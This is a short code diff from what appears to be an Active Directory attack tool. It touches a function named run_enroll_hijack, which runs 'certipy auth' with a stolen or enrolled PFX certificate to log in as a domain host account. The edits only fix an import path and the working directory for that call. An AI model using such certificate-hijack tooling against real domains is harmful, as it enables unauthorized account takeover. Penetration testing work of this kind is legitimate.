@@ -6,7 +6,7 @@ from pathlib import Path
 from typing import TYPE_CHECKING
 
 from admapper.adcs.analyze import get_adcs_finding
-from admapper.adcs.certipy import resolve_certipy
+from admapper.core.platform import resolve_certipy
 from admapper.adcs.enroll import build_local_enroll_powershell
 from admapper.core.output import print_info, print_success, print_warning
 from admapper.creds.common import pick_dc_ip
@@ -373,7 +373,7 @@ def run_enroll_hijack(
         certipy,
         "auth",
         "-pfx",
-        str(pfx),
+        str(pfx.name),
         "-username",
         host_user,
         "-domain",
@@ -382,7 +382,7 @@ def run_enroll_hijack(
         dc_ip,
     ]
     print_info(f"certipy auth as {domain}\\{host_user}")
-    auth_proc = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=120)
+    auth_proc = subprocess.run(auth_cmd, capture_output=True, text=True, timeout=120, cwd=str(pfx.parent))
     auth_out = (auth_proc.stdout or "") + (auth_proc.stderr or "")
     if auth_proc.returncode == 0:
         print_success("certificate authentication OK")
